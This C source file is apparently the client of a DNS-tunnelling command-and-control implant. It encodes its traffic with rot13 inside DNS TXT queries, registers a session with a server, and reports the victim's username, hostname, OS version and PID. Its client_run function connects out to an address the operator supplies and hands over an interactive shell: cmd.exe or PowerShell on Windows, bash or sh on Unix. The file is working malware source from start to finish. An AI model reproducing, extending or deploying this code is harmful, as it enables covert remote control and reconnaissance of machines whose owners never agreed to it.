#ifdef _WIN32
// clang-format off
#include <winsock2.h>
#include <windows.h>
// clang-format on 
#else
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#endif
#include <errno.h>
#include <limits.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "client.h"
#include "config.h"
#include "log.h"
#include "packet.h"
#include "util.h"

char session[SESSION_LEN + 1];

bool client_setup_socket(int s) {
  struct timeval timeout = {
      .tv_sec  = 10,
      .tv_usec = 0,
  };

  if (setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0) {
    debug("setsockopt failed for SO_RCVTIMEO: %s", strerror(errno));
    return false;
  }

  if (setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout)) < 0) {
    debug("setsockopt failed for SO_SNDTIMEO: %s", strerror(errno));
    return false;
  }

  return true;
}

bool client_recv(int s, struct sockaddr *addr, res_t *res) {
  dns_packet_t packet;
  if (!packet_recv(s, addr, &packet))
    return false;

  char    *data = packet.answers[0].rdata;
  uint16_t len  = packet.answers[0].rdlength;
  ssize_t  indx = 0;

  for (int i = 0; i < len; i++) {
    if (i == 0) {
      res->code = rot13_char(data[i]);
      continue;
    }
    res->arg[indx] = data[i];
    indx++;
  }

  // add null terminator
  res->arg[indx] = 0;
  rot13(res->arg);

  packet_free(&packet);
  return true;
}

bool client_send(int s, struct sockaddr *addr, req_t *req) {
  if (strlen(req->arg) > LABEL_LIMIT) {
    debug("failed to create command (bad arg size: %d > %d)", strlen(req->arg), LABEL_LIMIT);
    return false;
  }

  // [client_send] 1. build up the name
  // [client_send] 2. encode with rot13
  // [packet_send] 3. convert it to a label
  // for more details, see server/agent/protocol.go
  char name[REQ_LABEL_LEN][LABEL_LIMIT + 1];

  snprintf(name[0], LABEL_LIMIT + 1, "%s%s", ID, session);
  rot13(name[0]);

  snprintf(name[1], LABEL_LIMIT + 1, "%c", req->code);
  rot13(name[1]);

  if (req->end)
    snprintf(name[2], LABEL_LIMIT + 1, "1");
  else
    snprintf(name[2], LABEL_LIMIT + 1, "0");
  rot13(name[2]);

  snprintf(name[3], LABEL_LIMIT + 1, "%s", req->arg);
  rot13(name[3]);

  // creating the packet and the question
  dns_packet_t packet;
  dns_qd_t     question;

  bzero(&packet, sizeof(dns_packet_t));
  bzero(&question, sizeof(dns_qd_t));
  size_t packet_len = 0;

  // building the header
  packet.header.id      = randint(UINT16_MAX - 10, 1);
  packet.header.flags   = 288;
  packet.header.qdcount = 1;
  packet.header.ancount = 0;
  packet.header.nscount = 0;
  packet.header.arcount = 0;

  // alloc space for the question
  packet_alloc(&packet);

  // build the question
  packet.questions[0].qname = malloc(sizeof(char *) * REQ_LABEL_LEN + 1);
  for (int i = 0; i < REQ_LABEL_LEN; i++) {
    ssize_t len                  = strlen(name[i]) + 1;
    packet.questions[0].qname[i] = malloc(len);
    memcpy(packet.questions[0].qname[i], name[i], len);
  }
  packet.questions[0].qname[REQ_LABEL_LEN] = NULL;
  packet.questions[0].qtype                = 16;
  packet.questions[0].qclass               = 1;

  // oh here we go
  packet_send(s, addr, &packet);

  // cleanup
  packet_free(&packet);
  return true;
}

bool client_request(int s, struct sockaddr *addr, req_codes_t code, char *arg) {
  char   *argcp  = arg;
  ssize_t arglen = strlen(arg);
  req_t   req    = {
           .code = code,
           .end  = true,
           .arg  = NULL,
  };

  if (arglen <= ARGUMENT_LEN) {
    req.arg = arg;
    return client_send(s, addr, &req);
  }

  char part[ARGUMENT_LEN + 1];
  bzero(part, ARGUMENT_LEN + 1);
  req.end = false;

  while (arglen > ARGUMENT_LEN) {
    debug("sending multiple requests");
    if (req.arg != NULL)
      req.code = REQ_CONTINUE;

    req.arg = part;
    memcpy(part, argcp, ARGUMENT_LEN);

    if (!client_send(s, addr, &req))
      return false;

    arglen -= ARGUMENT_LEN;
    argcp += ARGUMENT_LEN;
    sleep(1);
  }

  if (arglen != 0) {
    debug("sending the last of the multiple requests");

    req.code = REQ_CONTINUE;
    req.end  = true;

    memcpy(part, argcp, arglen + 1); // +1 for the NULL terminator

    if (!client_send(s, addr, &req))
      return false;
  }

  return true;
}

bool client_register(int s, struct sockaddr *addr) {
  res_t res;

  if (!client_request(s, addr, REQ_REGISTER, "Can I register please?"))
    return false;

  if (!client_recv(s, addr, &res))
    return false;

  if (res.code != RES_OK) {
    debug("client_register got an invalid response");
    return false;
  }

  if (strlen(res.arg) != SESSION_LEN) {
    debug("bad session length");
    return false;
  }

  memcpy(session, res.arg, SESSION_LEN + 1);
  return true;
}

bool client_info(int s, struct sockaddr *addr) {
  res_t res;

#ifdef _WIN32
#define UNLEN 256
#define CNLEN 15

  char  hostname[CNLEN + 1];
  char  username[UNLEN + 1];
  DWORD username_len = UNLEN + 1;
  HKEY  hkey;
  DWORD keysize = 0;
  DWORD keytype = REG_SZ;

  bzero(hostname, CNLEN + 1);
  bzero(username, UNLEN + 1);

  if (gethostname(hostname, CNLEN + 1) != 0) {
    debug("_info: failed to get hostname");
    client_request(s, addr, REQ_FAIL, "Failed to get hostname");
    return false;
  }

  if (GetUserName(username, &username_len) == 0) {
    debug("_info: failed to get username");
    client_request(s, addr, REQ_FAIL, "Failed to get username");
    return false;
  }

  if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hkey) !=
      ERROR_SUCCESS) {
    debug("_info: failed to aget version info");
    client_request(s, addr, REQ_FAIL, "Failed to get version info");
    return false;
  }

  if (RegQueryValueExW(hkey, L"ProductName", NULL, NULL, NULL, &keysize) != ERROR_SUCCESS) {
    debug("_info: failed to query key size");
    client_request(s, addr, REQ_FAIL, "Failed to get version info");
    RegCloseKey(hkey);
    return false;
  }

  char version[keysize + 1];
  bzero(version, keysize + 1);
  RegCloseKey(hkey);

  if(RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", RRF_RT_REG_SZ, NULL, version, &keysize) != ERROR_SUCCESS){
    debug("_info: failed to read the key");
    client_request(s, addr, REQ_FAIL, "Failed to get version info");
    RegCloseKey(hkey);
    return false;
  }

  // 10 is for the PID, 5 is for extra space (@ and the space)
  ssize_t infolen = strlen(hostname) + strlen(username) + keysize + 1 + 10 + 5;

  char info[infolen];
  bzero(info, infolen);

  snprintf(info, infolen, "%s@%s@%s@%d", username, hostname, version, getpid());
  debug("_info: sending %s", info);
#else
  char           hostname[HOST_NAME_MAX + 1];
  char           username[LOGIN_NAME_MAX + 1];
  struct utsname udata;

  bzero(hostname, HOST_NAME_MAX + 1);
  bzero(username, LOGIN_NAME_MAX + 1);

  if (gethostname(hostname, HOST_NAME_MAX + 1) != 0) {
    debug("_info: failed to get hostname");
    client_request(s, addr, REQ_FAIL, "Failed to get hostaname");
    return false;
  }

  if (getlogin_r(username, LOGIN_NAME_MAX + 1) != 0) {
    debug("_info: failed to get username");
    client_request(s, addr, REQ_FAIL, "Failed to get username");
    return false;
  }

  if (uname(&udata) < 0) {
    debug("_info: failed to get uname");
    client_request(s, addr, REQ_FAIL, "Failed to get version info");
    return false;
  }

  // 10 is for the PID, 5 is for extra space (@ and the space)
  ssize_t infolen = strlen(hostname) + strlen(username) + strlen(udata.sysname) + strlen(udata.release) + 10 + 5;

  char info[infolen];
  bzero(info, infolen);

  snprintf(info, infolen, "%s@%s@%s %s@%d", username, hostname, udata.sysname, udata.release, getpid());
  debug("_info: sending %s", info);
#endif

  if (!client_request(s, addr, REQ_DONE, info))
    return false;

  if (!client_recv(s, addr, &res))
    return false;

  if (res.code != RES_OK) {
    debug("_info: got an invalid response");
    return false;
  }

  return true;
}

bool client_run(int s, struct sockaddr *addr, char *target) {
  res_t res;
#ifdef _WIN32
  struct sockaddr_in  revaddr;
  SOCKET              revsock;
  PROCESS_INFORMATION revproc;
  STARTUPINFO         revstart;

  revsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
  if (revsock == INVALID_SOCKET) {
    debug("_run: failed to create a socket");
    client_request(s, addr, REQ_FAIL, "Failed to create socket");
    return false;
  }

  revaddr.sin_family = AF_INET;
  if (!parse_addr(target, &revaddr)) {
    debug("_run: bad address");
    client_request(s, addr, REQ_FAIL, "Bad address");
    return false;
  }

  if (WSAConnect(revsock, (SOCKADDR *)&revaddr, sizeof(revaddr), NULL, NULL, NULL, NULL) != 0) {
    debug("_run: failed to connect");
    client_request(s, addr, REQ_FAIL, "Failed to connect");
    return false;
  }

  fprintfsock(revsock, "[+] Connected! You are running as PID %d\n", getpid());
  fprintfsock(revsock, "[*] Executing an avaliable shell\n");

  bzero(&revstart, sizeof(revstart));
  revstart.cb        = sizeof(revstart);
  revstart.dwFlags   = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  revstart.hStdInput = revstart.hStdOutput = revstart.hStdError = (HANDLE)revsock;

  if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &revstart, &revproc) == 0) {
    fprintfsock(revsock, "[-] Failed to execute cmd, trying powershell\n");
    if (CreateProcess(NULL, "powershell.exe", NULL, NULL, TRUE, 0, NULL, NULL, &revstart, &revproc) == 0) {
      fprintfsock(revsock, "[-] Failed to execute powershell\n");
      fprintfsock(revsock, "[-] Closing connection because there were no avaliable shells\n");

      debug("_run: failed to run a shell");
      client_request(s, addr, REQ_FAIL, "Failed to run a shell");
      return false;
    }
  }

  closesocket(revsock);
#else

  struct sockaddr_in revaddr;
  int                revsock;
  pid_t              pid;

  if (!parse_addr(target, &revaddr)) {
    debug("_run: bad address");
    client_request(s, addr, REQ_FAIL, "Bad address");
    exit(0);
  }

  revsock            = socket(AF_INET, SOCK_STREAM, 0);
  revaddr.sin_family = AF_INET;

  if (connect(revsock, (struct sockaddr *)&revaddr, sizeof(revaddr)) < 0) {
    debug("_run: connect failed (%s)", strerror(errno));
    client_request(s, addr, REQ_FAIL, "Failed to connect");
    exit(0);
  }

  dprintf(revsock, "[+] Connected! You are running as PID %d\n", getpid());
  dprintf(revsock, "[*] Executing an avaliable shell\n");

  pid = fork();

  if (pid == 0) {
    dup2(revsock, STDOUT_FILENO);
    dup2(revsock, STDERR_FILENO);
    dup2(revsock, STDIN_FILENO);

    char *argv[] = {"bash", "-i", NULL};
    execvp("bash", argv);

    // if bash is not found execute sh
    dprintf(revsock, "[-] Failed to execute bash, trying sh\n");
    argv[0] = "sh";
    execvp("sh", argv);

    // if sh is not found just exit
    dprintf(revsock, "[-] Failed to execute sh\n");
    dprintf(revsock, "[-] Closing connection because there were no avaliable shells\n");

    close(revsock);
    exit(0);
  }

  close(revsock);
#endif

  if (!client_request(s, addr, REQ_DONE, "Sent the shell connection"))
    return false;

  if (!client_recv(s, addr, &res))
    return false;

  if (res.code != RES_OK) {
    debug("_run: got invalid response");
    return false;
  }

  return true;
}

bool client_kill(int s, struct sockaddr *addr) {
  client_request(s, addr, REQ_DONE, "Killed the connection");

  close(s);
  exit(1);

  // never runs
  return true;
}
